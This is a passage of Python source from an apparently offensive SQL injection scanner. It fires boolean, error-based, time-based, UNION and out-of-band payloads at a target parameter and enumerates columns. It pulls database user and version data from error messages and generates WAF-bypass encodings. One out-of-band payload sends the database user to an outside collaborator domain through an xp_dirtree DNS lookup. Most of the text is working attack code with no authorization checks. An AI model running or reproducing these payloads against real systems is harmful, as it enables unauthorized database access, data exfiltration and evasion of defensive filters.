                                    'status_code': response.status_code
                                }
                                results.append(vuln)
                                notify_vulnerability(vuln)
                                print(f"{Fore.RED}[!] CRITICAL: {db_type} UNION data extraction: {query_name}{Style.RESET_ALL}")
                                print(f"    Extracted data indicators: {', '.join(found_indicators[:3])}")
                        
                    except Exception:
                        continue
        
        return results
    
    def test_blind_sqli_comprehensive(self, url, param, method='GET'):
        """
        Comprehensive Blind SQL Injection testing
        Based on professional security guide techniques
        """
        results = []
        
        print(f"{Fore.CYAN}[*] Starting comprehensive Blind SQL injection testing...{Style.RESET_ALL}")
        
        # Test 1: Conditional Response Blind SQLi
        conditional_results = self.test_conditional_blind_sqli(url, param, method)
        results.extend(conditional_results)
        
        # Test 2: Error-based Blind SQLi  
        error_based_results = self.test_error_based_blind_sqli(url, param, method)
        results.extend(error_based_results)
        
        # Test 3: Time-based Blind SQLi
        time_based_results = self.test_time_based_blind_sqli(url, param, method)
        results.extend(time_based_results)
        
        # Test 4: Out-of-band (OAST) techniques
        if self.level == 'extreme':
            oast_results = self.test_oast_blind_sqli(url, param, method)
            results.extend(oast_results)
        
        return results
    
    def test_conditional_blind_sqli(self, url, param, method='GET'):
        """Test for conditional response blind SQL injection"""
        results = []
        
        print(f"{Fore.CYAN}[*] Testing conditional response blind SQLi...{Style.RESET_ALL}")
        
        # Get baseline response
        try:
            if method.upper() == 'GET':
                baseline_response = requests.get(url, params={param: 'normal_value'}, timeout=self.timeout, verify=False)
            else:
                baseline_response = requests.post(url, data={param: 'normal_value'}, timeout=self.timeout, verify=False)
        except:
            return results
        
        # Conditional blind SQLi payloads (tracking cookie style)
        conditional_payloads = [
            # Basic boolean conditions  
            ("' AND '1'='1", "' AND '1'='2"),  # True vs False condition
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR '1'='1'--", "' OR '1'='2'--"),
            
            # Tracking cookie style (common in blind SQLi scenarios)
            ("xyz' AND '1'='1", "xyz' AND '1'='2"),
            ("abc123' AND 1=1--", "abc123' AND 1=2--"),
            
            # Substring testing for data extraction
            ("' AND SUBSTRING((SELECT user()),1,1)>'a'--", "' AND SUBSTRING((SELECT user()),1,1)>'z'--"),
            ("' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--", "' AND ASCII(SUBSTRING((SELECT user()),1,1))>255--"),
        ]
        
        for true_payload, false_payload in conditional_payloads:
            try:
                # Test TRUE vs FALSE conditions
                if method.upper() == 'GET':
                    true_response = requests.get(url, params={param: true_payload}, timeout=self.timeout, verify=False)
                    false_response = requests.get(url, params={param: false_payload}, timeout=self.timeout, verify=False)
                else:
                    true_response = requests.post(url, data={param: true_payload}, timeout=self.timeout, verify=False)
                    false_response = requests.post(url, data={param: false_payload}, timeout=self.timeout, verify=False)
                
                # Compare responses for differences
                true_length = len(true_response.text)
                false_length = len(false_response.text)
                
                # Look for conditional response indicators
                conditional_indicators = [
                    'welcome back', 'logged in', 'authentication successful', 'valid user',
                    'access granted', 'session active', 'user found', 'authorized'
                ]
                
                true_has_indicators = any(indicator in true_response.text.lower() for indicator in conditional_indicators)
                false_has_indicators = any(indicator in false_response.text.lower() for indicator in conditional_indicators)
                
                # Detect blind SQLi based on response differences
                if (true_length != false_length or 
                    true_response.status_code != false_response.status_code or
                    true_has_indicators != false_has_indicators):
                    
                    vuln = {
                        'type': 'Conditional Response Blind SQL Injection',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'method': method,
                        'evidence': f'Different responses: True({true_length}b) vs False({false_length}b)',
                        'attack_vector': 'Boolean-based blind SQL injection via conditional responses',
                        'impact': 'Data extraction possible via boolean enumeration',
                        'remediation': 'Use parameterized queries, validate input'
                    }
                    results.append(vuln)
                    notify_vulnerability(vuln)
                    print(f"{Fore.RED}[!] Conditional Blind SQLi: {url} (param: {param}){Style.RESET_ALL}")
                    print(f"    Response difference: {true_length}b vs {false_length}b")
                    break
                    
            except Exception:
                continue
        
        return results
    
    def test_error_based_blind_sqli(self, url, param, method='GET'):
        """Test for error-based blind SQL injection"""
        results = []
        
        print(f"{Fore.CYAN}[*] Testing error-based blind SQLi...{Style.RESET_ALL}")
        
        # Error-based blind SQLi payloads using CASE statements
        error_based_payloads = [
            # CASE WHEN conditional error generation
            ("' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--",
             "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--"),
            
            # CAST function for verbose error messages
            ("' AND CAST((SELECT user()) AS int)--",
             "' AND CAST('normal_string' AS int)--"),
            
            # EXTRACTVALUE error generation (MySQL)
            ("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
             "' AND EXTRACTVALUE(1, CONCAT(0x7e, 'test', 0x7e))--"),
        ]
        
        for error_payload, normal_payload in error_based_payloads:
            try:
                if method.upper() == 'GET':
                    error_response = requests.get(url, params={param: error_payload}, timeout=self.timeout, verify=False)
                    normal_response = requests.get(url, params={param: normal_payload}, timeout=self.timeout, verify=False)
                else:
                    error_response = requests.post(url, data={param: error_payload}, timeout=self.timeout, verify=False)
                    normal_response = requests.post(url, data={param: normal_payload}, timeout=self.timeout, verify=False)
                
                # Look for conditional error patterns
                conditional_error_patterns = [
                    r"division by zero", r"divide by zero", r"arithmetic.*overflow",
                    r"conversion.*failed.*int", r"invalid.*input.*syntax.*integer",
                    r"unterminated string literal", r"XPATH syntax error"
                ]
                
                has_conditional_errors = any(re.search(pattern, error_response.text, re.IGNORECASE) 
                                           for pattern in conditional_error_patterns)
                normal_has_errors = any(re.search(pattern, normal_response.text, re.IGNORECASE) 
                                      for pattern in conditional_error_patterns)
                
                # Detect error-based blind SQLi
                if (has_conditional_errors and not normal_has_errors) or error_response.status_code != normal_response.status_code:
                    
                    # Extract verbose error data if available
                    verbose_data = self.extract_verbose_error_data(error_response.text)
                    
                    vuln = {
                        'type': 'Error-based Blind SQL Injection',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'error_payload': error_payload,
                        'method': method,
                        'evidence': 'Conditional database errors detected',
                        'attack_vector': 'Error-based blind SQL injection via conditional error generation',
                        'impact': 'Data extraction via error message analysis',
                        'remediation': 'Implement proper error handling, use parameterized queries'
                    }
                    
                    if verbose_data:
                        vuln['verbose_error_data'] = verbose_data
                        print(f"    Verbose error data: {verbose_data[:50]}...")
                    
                    results.append(vuln)
                    notify_vulnerability(vuln)
                    print(f"{Fore.RED}[!] Error-based Blind SQLi: {url} (param: {param}){Style.RESET_ALL}")
                    break
                    
            except Exception:
                continue
        
        return results
    
    def test_time_based_blind_sqli(self, url, param, method='GET'):
        """Test for time-based blind SQL injection"""
        results = []
        
        print(f"{Fore.CYAN}[*] Testing time-based blind SQLi...{Style.RESET_ALL}")
        
        # Database-specific time delay payloads
        time_delay_payloads = [
            # Microsoft SQL Server
            ("'; IF (1=1) WAITFOR DELAY '0:0:5'--", "'; IF (1=2) WAITFOR DELAY '0:0:5'--"),
            
            # MySQL
            ("' AND IF(1=1,SLEEP(5),'a')='a'--", "' AND IF(1=2,SLEEP(5),'a')='a'--"),
            
            # PostgreSQL  
            ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
             "'; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--"),
        ]
        
        for delay_payload, normal_payload in time_delay_payloads:
            try:
                # Test normal payload first (baseline timing)
                start_time = time.time()
                if method.upper() == 'GET':
                    normal_response = requests.get(url, params={param: normal_payload}, timeout=15, verify=False)
                else:
                    normal_response = requests.post(url, data={param: normal_payload}, timeout=15, verify=False)
                normal_time = time.time() - start_time
                
                # Test delay payload
                start_time = time.time()
                if method.upper() == 'GET':
                    delay_response = requests.get(url, params={param: delay_payload}, timeout=15, verify=False)
                else:
                    delay_response = requests.post(url, data={param: delay_payload}, timeout=15, verify=False)
                delay_time = time.time() - start_time
                
                # Check for time-based blind SQLi (significant delay difference)
                time_difference = delay_time - normal_time
                if time_difference >= 4:  # At least 4 seconds delay for 5-second payload
                    vuln = {
                        'type': 'Time-based Blind SQL Injection',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': param,
                        'delay_payload': delay_payload,
                        'method': method,
                        'evidence': f'Time delay: {delay_time:.2f}s vs {normal_time:.2f}s (diff: {time_difference:.2f}s)',
                        'attack_vector': 'Time-based blind SQL injection via conditional delays',
                        'impact': 'Critical: Data extraction via timing analysis',
                        'remediation': 'Critical fix required - implement parameterized queries'
                    }
                    results.append(vuln)
                    notify_vulnerability(vuln)
                    print(f"{Fore.RED}[!] Time-based Blind SQLi: {url} (delay: {time_difference:.2f}s){Style.RESET_ALL}")
                    break
                    
            except requests.exceptions.Timeout:
                # Timeout indicates successful time-based injection
                vuln = {
                    'type': 'Time-based Blind SQL Injection (Timeout)',
                    'severity': 'Critical',
                    'url': url,
                    'parameter': param,
                    'payload': delay_payload,
                    'method': method,
                    'evidence': 'Request timeout on time-based payload',
                    'attack_vector': 'Confirmed time-based blind SQL injection',
                    'impact': 'Critical: Time-based injection confirmed via timeout',
                    'remediation': 'Immediate fix required for time-based vulnerabilities'
                }
                results.append(vuln)
                notify_vulnerability(vuln)
                print(f"{Fore.RED}[!] CRITICAL: Time-based Blind SQLi (Timeout): {url}{Style.RESET_ALL}")
                break
            except Exception:
                continue
        
        return results
    
    def test_oast_blind_sqli(self, url, param, method='GET'):
        """Test for out-of-band (OAST) blind SQL injection"""
        results = []
        
        print(f"{Fore.CYAN}[*] Testing out-of-band (OAST) blind SQLi...{Style.RESET_ALL}")
        
        # Generate unique subdomain for OAST testing
        import random, string
        unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        oast_domain = f"{unique_id}.zerohack.collaborator.test"
        
        # OAST payloads for different databases
        oast_payloads = [
            # Microsoft SQL Server - DNS lookup via xp_dirtree
            f"'; exec master..xp_dirtree '//{oast_domain}/a'--",
            
            # MySQL - DNS lookup via LOAD_FILE (UNC path)
            f"' AND LOAD_FILE('//{oast_domain}/test')--",
            
            # Data extraction via OAST
            f"'; declare @p varchar(1024);set @p=(SELECT user());exec('master..xp_dirtree \"//'+@p+'.{oast_domain}/a\"')--",
        ]
        
        for oast_payload in oast_payloads:
            try:
                if method.upper() == 'GET':
                    response = requests.get(url, params={param: oast_payload}, timeout=self.timeout, verify=False)
                else:
                    response = requests.post(url, data={param: oast_payload}, timeout=self.timeout, verify=False)
                
                vuln = {
                    'type': 'Out-of-Band (OAST) Blind SQL Injection',
                    'severity': 'Critical',
                    'url': url,
                    'parameter': param,
                    'payload': oast_payload,
                    'method': method,
                    'oast_domain': oast_domain,
                    'evidence': f'OAST payload processed - check {oast_domain} for interactions',
                    'attack_vector': 'Out-of-band data exfiltration via DNS/HTTP',
                    'impact': 'Critical: Direct data exfiltration possible',
                    'remediation': 'Block outbound connections, use parameterized queries',
                    'note': 'Verify OAST interactions on your controlled domain/server'
                }
                results.append(vuln)
                notify_vulnerability(vuln)
                print(f"{Fore.RED}[!] OAST Blind SQLi: {url} - Check {oast_domain}{Style.RESET_ALL}")
                    
            except Exception:
                continue
        
        return results
    
    def extract_verbose_error_data(self, response_text):
        """Extract sensitive data from verbose SQL error messages"""
        patterns = [
            r"unterminated string literal.*position \d+.*SQL (.*)",
            r"invalid input syntax.*\"(.*)\"", 
            r"conversion failed.*\"(.*)\"",
            r"XPATH syntax error.*\"(.*)\""
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1)[:100]  # Return first 100 chars
        
        return None

    def test_comprehensive_sqli_types(self, url, param, method='GET'):
        """Test all SQL injection types as per the provided classification"""
        results = []
        
        print(f"{Fore.CYAN}[*] Testing comprehensive SQLi types on {param}...{Style.RESET_ALL}")
        
        # 1. In-band SQLi Testing
        in_band_results = self.test_in_band_sqli(url, param, method)
        results.extend(in_band_results)
        
        # 2. Inferential SQLi Testing (Blind)
        inferential_results = self.test_inferential_sqli(url, param, method)
        results.extend(inferential_results)
        
        # 3. Out-of-band SQLi Testing
        oob_results = self.test_out_of_band_sqli(url, param, method)
        results.extend(oob_results)
        
        return results

    def test_in_band_sqli(self, url, param, method='GET'):
        """Test In-band SQL Injection (Error-based and Union-based)"""
        results = []
        
        # Error-based SQLi detection
        error_payloads = [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            "' AND CAST((SELECT version()) AS int)--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--"
        ]
        
        for payload in error_payloads:
            try:
                if method.upper() == 'GET':
                    response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
                else:
                    response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
                
                # Check for database-specific error patterns
                if self.check_error_patterns(response.text):
                    vuln = {
                        'type': 'In-band SQL Injection (Error-based)',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'evidence': 'Database error messages revealed',
                        'attack_vector': 'Error-based data extraction',
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"    {Fore.RED}[!] Error-based SQLi detected{Style.RESET_ALL}")
                    break
                    
            except Exception:
                continue
        
        # Union-based SQLi detection (based on provided diagram)
        union_results = self.test_union_based_sqli(url, param, method)
        results.extend(union_results)
        
        return results

    def test_union_based_sqli(self, url, param, method='GET'):
        """Test Union-based SQL Injection (as shown in diagram)"""
        results = []
        
        print(f"    {Fore.YELLOW}[*] Testing UNION-based SQLi...{Style.RESET_ALL}")
        
        # First, determine the number of columns
        column_count = self.determine_column_count(url, param, method)
        
        if column_count:
            # UNION payloads based on detected column count
            union_payloads = [
                f"' UNION SELECT {','.join(['NULL'] * column_count)}--",
                f"' UNION SELECT {','.join([str(i) for i in range(1, column_count + 1)])}--",
                f"' UNION SELECT database(),user(),version(),{','.join(['NULL'] * (column_count - 3))}--" if column_count >= 3 else None,
                f"' UNION SELECT table_name,column_name,{','.join(['NULL'] * (column_count - 2))} FROM information_schema.columns--" if column_count >= 2 else None
            ]
            
            # Filter out None payloads
            union_payloads = [p for p in union_payloads if p is not None]
            
            for payload in union_payloads:
                try:
                    if method.upper() == 'GET':
                        response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
                    else:
                        response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
                    
                    # Check for successful UNION injection
                    if self.check_union_success(response.text, column_count):
                        vuln = {
                            'type': 'In-band SQL Injection (Union-based)',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'column_count': column_count,
                            'evidence': 'UNION SELECT successful - data extraction possible',
                            'attack_vector': 'Union-based data extraction',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"    {Fore.RED}[!] UNION-based SQLi detected (columns: {column_count}){Style.RESET_ALL}")
                        break
                        
                except Exception:
                    continue
        
        return results

    def test_inferential_sqli(self, url, param, method='GET'):
        """Test Inferential SQL Injection (Boolean-based and Time-based blind)"""
        results = []
        
        # Boolean-based blind SQLi
        boolean_results = self.test_boolean_based_sqli(url, param, method)
        results.extend(boolean_results)
        
        # Time-based blind SQLi
        time_results = self.test_time_based_sqli(url, param, method)
        results.extend(time_results)
        
        return results

    def test_boolean_based_sqli(self, url, param, method='GET'):
        """Test Boolean-based Blind SQL Injection"""
        results = []
        
        print(f"    {Fore.YELLOW}[*] Testing Boolean-based blind SQLi...{Style.RESET_ALL}")
        
        # Get baseline responses
        try:
            if method.upper() == 'GET':
                true_response = requests.get(url, params={param: "' AND 1=1--"}, timeout=self.timeout, verify=False)
                false_response = requests.get(url, params={param: "' AND 1=2--"}, timeout=self.timeout, verify=False)
            else:
                true_response = requests.post(url, data={param: "' AND 1=1--"}, timeout=self.timeout, verify=False)
                false_response = requests.post(url, data={param: "' AND 1=2--"}, timeout=self.timeout, verify=False)
            
            # Compare responses to detect boolean-based SQLi
            if self.compare_boolean_responses(true_response, false_response):
                vuln = {
                    'type': 'Inferential SQL Injection (Boolean-based blind)',
                    'severity': 'High',
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'evidence': 'Different responses for TRUE/FALSE conditions',
                    'attack_vector': 'Boolean-based blind data extraction',
                    'true_length': len(true_response.text),
                    'false_length': len(false_response.text)
                }
                results.append(vuln)
                print(f"    {Fore.RED}[!] Boolean-based blind SQLi detected{Style.RESET_ALL}")
                
        except Exception:
            pass
        
        return results

    def test_time_based_sqli(self, url, param, method='GET'):
        """Test Time-based Blind SQL Injection"""
        results = []
        
        print(f"    {Fore.YELLOW}[*] Testing Time-based blind SQLi...{Style.RESET_ALL}")
        
        time_payloads = [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5)--"
        ]
        
        for payload in time_payloads:
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    response = requests.get(url, params={param: payload}, timeout=self.timeout + 5, verify=False)
                else:
                    response = requests.post(url, data={param: payload}, timeout=self.timeout + 5, verify=False)
                
                response_time = time.time() - start_time
                
                # If response took significantly longer (indicating sleep worked)
                if response_time >= 4.5:  # Allow some variance
                    vuln = {
                        'type': 'Inferential SQL Injection (Time-based blind)',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'response_time': response_time,
                        'evidence': f'Response delayed by {response_time:.2f} seconds',
                        'attack_vector': 'Time-based blind data extraction'
                    }
                    results.append(vuln)
                    print(f"    {Fore.RED}[!] Time-based blind SQLi detected ({response_time:.2f}s delay){Style.RESET_ALL}")
                    break
                    
            except requests.exceptions.Timeout:
                # Timeout might indicate successful time-based injection
                vuln = {
                    'type': 'Inferential SQL Injection (Time-based blind)',
                    'severity': 'High',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'evidence': 'Request timed out - possible time-based SQLi',
                    'attack_vector': 'Time-based blind data extraction'
                }
                results.append(vuln)
                print(f"    {Fore.RED}[!] Time-based blind SQLi detected (timeout){Style.RESET_ALL}")
                break
            except Exception:
                continue
        
        return results

    def determine_column_count(self, url, param, method='GET', max_columns=20):
        """Determine the number of columns for UNION-based injection"""
        
        for i in range(1, max_columns + 1):
            payload = f"' ORDER BY {i}--"
            
            try:
                if method.upper() == 'GET':
                    response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
                else:
                    response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
                
                # If ORDER BY fails, we've found the column count
                if self.check_error_patterns(response.text) or response.status_code >= 400:
                    return i - 1 if i > 1 else None
                    
            except Exception:
                continue
        
        return None

    def check_union_success(self, response_text, column_count):
        """Check if UNION injection was successful"""
        # Look for indicators of successful UNION
        success_indicators = [
            str(column_count),  # Column numbers might appear
            'information_schema',
            'database()',
            'user()',
            'version()'
        ]
        
        return any(indicator in response_text for indicator in success_indicators)

    def compare_boolean_responses(self, true_response, false_response):
        """Compare responses to detect boolean-based SQLi"""
        # Different response lengths
        if abs(len(true_response.text) - len(false_response.text)) > 50:
            return True
        
        # Different status codes
        if true_response.status_code != false_response.status_code:
            return True
        
        # Different response times (basic check)
        return False

    def check_error_patterns(self, response_text):
        """Check for SQL error patterns in response"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def create_comment_variations(self, payload):
        """Create payload variations with different comment styles for WAF bypass"""
        variations = [payload]  # Original payload
        
        # Add comment variations to bypass WAF filters
        for comment in self.comment_variations:
            if comment == "#":
                variations.append(payload + "#")
                variations.append(payload.replace(" ", comment))
            elif comment == "/**/":
                variations.append(payload.replace(" ", "/**/"))
                variations.append(payload + "/**/")
            elif comment == "-- -":
                variations.append(payload + "-- -")
                variations.append(payload.replace("--", "-- -"))
            elif comment == ";%00":
                variations.append(payload + ";%00")
            elif comment == "`":
                # Backtick variations for MySQL
                variations.append(payload.replace("'", "`"))
                variations.append(payload + "`")
        
        return variations[:10]  # Limit to first 10 variations

    def enhance_payload_with_encoding(self, payload):
        """Enhance payload with various encoding techniques"""
        import urllib.parse
        
        enhanced_payloads = [
            payload,  # Original
            urllib.parse.quote(payload),  # URL encoded
            urllib.parse.quote_plus(payload),  # URL encoded with plus
            payload.replace("'", "%27"),  # Manual single quote encoding
            payload.replace(" ", "%20"),  # Manual space encoding
            payload.replace("=", "%3D"),  # Manual equals encoding
        ]
        
        return enhanced_payloads

    def get_payload_statistics(self):
        """Get statistics about available payloads"""
        stats = {
            'basic_payloads': len(self.basic_payloads),
            'generic_payloads': len(self.generic_payloads),
            'error_based_payloads': len(self.error_based_payloads),
            'order_by_payloads': len(self.order_by_payloads),
            'advanced_payloads': len(self.advanced_payloads),
            'time_based_payloads': len(self.time_based_payloads),
            'comment_variations': len(self.comment_variations),
            'total_base_payloads': len(self.basic_payloads) + len(self.generic_payloads) + len(self.error_based_payloads) + len(self.order_by_payloads) + len(self.advanced_payloads) + len(self.time_based_payloads)
        }
        
        # Database-specific payload counts
        for db_type, payloads in self.db_specific_payloads.items():
            stats[f'{db_type}_specific'] = len(payloads)
        
        return stats